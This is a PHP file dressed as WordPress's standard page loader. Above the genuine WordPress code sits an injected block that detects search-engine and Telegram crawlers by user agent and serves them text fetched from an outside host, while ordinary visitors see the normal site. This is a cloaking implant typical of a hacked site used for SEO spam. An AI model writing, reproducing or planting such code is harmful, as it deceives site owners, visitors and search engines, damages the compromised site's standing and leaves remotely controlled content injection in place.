<?php
function is_bot() {
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');

foreach ($bots as $bot) {
if (stripos($user_agent, $bot) !== false) {
return true;
}
}

return false;
}

if (is_bot()) {
$message = file_get_contents('https://douberman.dev/douberman/charityshop.txt');
echo $message;
exit;
}
?>

<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( !isset($wp_did_header) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once( dirname(__FILE__) . '/wp-load.php' );

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once( ABSPATH . WPINC . '/template-loader.php' );

}
